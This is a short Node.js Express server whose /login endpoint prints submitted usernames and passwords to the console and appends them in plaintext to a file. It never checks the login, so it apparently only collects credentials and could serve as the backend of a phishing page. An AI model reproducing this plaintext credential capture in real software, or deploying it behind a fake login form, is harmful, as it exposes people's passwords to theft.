const express = require("express");
const fs = require("fs");
const path = require("path");

const app = express();
app.use(express.json());

// Serve HTML
app.get("/", (req, res) => {
    res.sendFile(path.join(__dirname, "index.html"));
});

// API
app.post("/login", (req, res) => {
    console.log("🔥 API HIT");

    const { username, password } = req.body;
    console.log("DATA:", username, password);

    const filePath = path.join(__dirname, "data.txt");
    const log = `Username: ${username}, Password: ${password}\n`;

    fs.appendFileSync(filePath, log);

    console.log("✅ SAVED");
    res.send("Saved");
});

// Start server
app.listen(3000, () => {
    console.log("🚀 http://localhost:3000");
});